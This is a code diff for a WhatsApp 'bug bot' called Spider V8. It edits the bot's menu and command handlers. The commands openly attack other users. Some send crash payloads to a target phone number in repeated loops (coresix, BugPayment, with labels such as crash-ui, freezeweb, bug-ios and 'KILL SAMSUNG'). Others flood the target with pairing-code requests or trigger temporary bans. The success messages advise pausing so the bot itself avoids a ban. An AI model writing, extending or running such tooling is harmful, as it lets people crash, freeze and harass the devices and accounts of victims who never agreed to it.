@@ -1019,62 +1019,15 @@ let nest = `
    ➣ 𝚙𝚒𝚗𝚐: ${latensi.toFixed(4)}
    ➣ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${run}
 ▬▬▬▬▬▬▬▬▬▬▬▬▬
-> 𝗠𝗘𝗧𝗔 𝗪𝗔 + (𝗡𝗨𝗠)
+> 𝗠𝗔𝗜𝗡
 
-◆ meta-kill
-◆ spider-web
-◆ s-bug
-◆ bugcity
-◆ gass
-◆ gasfull
-◆ spam
-◆ oke
-▬▬▬▬▬▬▬▬▬▬▬▬▬
-> 𝗖𝗥𝗔𝗦𝗛 𝗨𝗜 + (𝗡𝗨𝗠)
-
-◆ stystemui
-◆ destroy-ui
-◆ crash-ui
-◆ devil-spider
-▬▬▬▬▬▬▬▬▬▬▬▬▬
-> 𝗪𝗔 𝗕𝗘𝗧𝗔 + (𝗡𝗨𝗠)
-
-◆ sspider
-◆ miracle
-◆ sam-test
-◆ crash-beta
-◆ test-beta
-▬▬▬▬▬▬▬▬▬▬▬▬▬
-> 𝗪𝗔 𝗪𝗘𝗕 + (𝗡𝗨𝗠)
-
-◆ freezeweb
-◆ killall
-◆ terror
-◆ xios
-▬▬▬▬▬▬▬▬▬▬▬▬▬
-> 𝗕𝗨𝗚 𝗘𝗠𝗢𝗝𝗜 + (𝗡𝗨𝗠)
-
-◆ 🏴‍☠️
-◆ 💥
-◆ 🔥
-◆ 🕷️
-◆ 🦄
-◆ 🕸️
-▬▬▬▬▬▬▬▬▬▬▬▬▬
-> 𝗗𝗜𝗥𝗘𝗖𝗧 𝗗𝗠
-
-◆ sam-did
-◆ night-night
-◆ ugly-face
-◆ bye-bye
-◆ kingcall
+◆ trash
 ▬▬▬▬▬▬▬▬▬▬▬▬▬
 > 𝗜𝗢𝗦 𝗕𝗨𝗚𝗦
 
 ◆ bug-ios
 ◆ fake-ios
 ◆ iospenetrate
-◆ test-ios
 ▬▬▬▬▬▬▬▬▬▬▬▬▬
 > 𝗢𝗧𝗣 𝗟𝗢𝗖𝗞
 
@@ -1169,7 +1122,7 @@ sam.sendMessage(args[0] + "@s.whatsapp.net", {text: `You are now a Premium Membe
 }
 }
 break
-case "spam-pairing": {
+case "spam-pair": {
 if (!isCreator) return reply(mess.owner)
 if (!q) return reply(`*Example:* ${prefix + command} +2547888888888|150`)
 let [targetNumber, attemptCount = "100"] = q.split("|")
@@ -1290,10 +1243,10 @@ case 'trash': {
 					}]
 				},
 				{
-					highlight_label: "🔥𝐅𝐈𝐍𝐈𝐒𝐇🗿",
+					highlight_label: "🔥𝐊𝐈𝐋𝐋 𝐒𝐀𝐌𝐒𝐔𝐍𝐆🗿",
 					rows: [{
 						title: '☼𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆 4 ☘',
-						id: `.spam ${incTarget}`
+						id: `.samsung-try ${incTarget}`
 					}]
 				},
 				{   
@@ -1329,7 +1282,7 @@ case 'trash': {
 				{
 					title: '⌜ 𝐇𝚯𝐋𝐃 ⌟',
 					rows: [{
-						title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐏𝐚ͮ͢𝐢𝐫༑',
+						title: '𝐓𝐄𝐌𝐏-𝐁𝐀𝐍',
 						id: `.temp-ban ${incTarget}`
 					}]
 				}
@@ -1353,7 +1306,7 @@ case 'trash': {
 								forwardingScore: 999,
 								forwardedNewsletterMessageInfo: {
 									newsletterJid: '120363320283062687@newsletter',
-									newsletterName: '☠️⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🦄',
+									newsletterName: '☠️⃟S҉ P҉ I҉ D҉ E҉ R҉  C҉ R҉ A҉ S҉ H҉ 🦄',
 									serverMessageId: -1
 								},
 								businessMessageForwardInfo: {
@@ -1367,12 +1320,12 @@ case 'trash': {
 								text: `⿻  ⌜ 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8 ⌟  ⿻`
 							}),
 							header: proto.Message.InteractiveMessage.Header.create({
-								title: `\n😈⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡☠️\n›› 𝐓𝐫𝐚𝐬𝐡 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
+								title: `\n⃟🕷️ S҉ P҉ I҉ D҉ E҉ R҉  V҉ 8 🔥⃟\n›› 𝐓𝐫𝐚𝐬𝐡 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
 								subtitle: `️`,
 								hasMediaAttachment: true,
 								...(await prepareWAMessageMedia({
 									image: {
-										url: 'https://i.imgur.com/xdt2g23.jpeg'
+										url: 'https://i.imgur.com/xdt2g23.jpg'
 									}
 								}, {
 									upload: sam.waUploadToServer
@@ -1436,7 +1389,7 @@ reply("Premium not found")
 }
 break
 case 'addowner': {
-if (!isOwner) return reply(mess.owner)
+if (!isCreator) return reply(mess.owner)
 if (!args[0]) return reply(`*Example:* ${prefix+command} 2547xxxxxxxx`)
 prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
 let cek1 = await sam.onWhatsApp(prem1 + `@s.whatsapp.net`)
@@ -1449,7 +1402,7 @@ sam.sendMessage(prem1+'@s.whatsapp.net', {text: `You are now the bot owner/contr
 break
 
 case 'delowner': {
-if (!isOwner) return reply(mess.owner)
+if (!isCreator) return reply(mess.owner)
 if (!args[0]) return reply(`*Example:* ${prefix+command} 2547xxxxxxx`)
 prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
 unp = kontributor.indexOf(prem2)
@@ -1497,7 +1450,7 @@ await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 }
 
-await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 case 'meta-kill': case 'spider-web': {
@@ -1534,7 +1487,7 @@ await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 }
-await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 case 'kingcall': case 'night-night': case 'sam-did': case 'ugly-face': {
@@ -1573,7 +1526,7 @@ await coresix(Pe, "", 1020000, true);
 await coresix(Pe, "", 1020000, true);
 await sleep(500)
 }
-await reply(`_Successfully Send Bug to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully spider has deliver 🕷️ to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break;
 case 'freezeweb': case 'kill-all': case 'terror': case 'xios': {
@@ -1590,7 +1543,7 @@ await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 }
-await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully spider has deliver 🕷️ to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 case 'crash-beta': 
@@ -1610,7 +1563,7 @@ await coresix(target, "", 1020000, true);
 await BugPayment(target);
 await sleep(500)
 }
-await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully Spider has delivered to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 case 'gasfull': case 'gass': case 'spam': case'oke': {
@@ -1630,7 +1583,7 @@ await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 }
 await sleep(4000)
-await reply(`_Successfully Send Bug to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`Succeful Spider has delivered ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 case 'iospenetrate': case 'bug-ios': {
@@ -1684,7 +1637,7 @@ await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 }
-await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 case'sspider':
@@ -1706,7 +1659,7 @@ await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 await coresix(target, "p", 1020000, true);
 }
-await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
+await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //============================================//
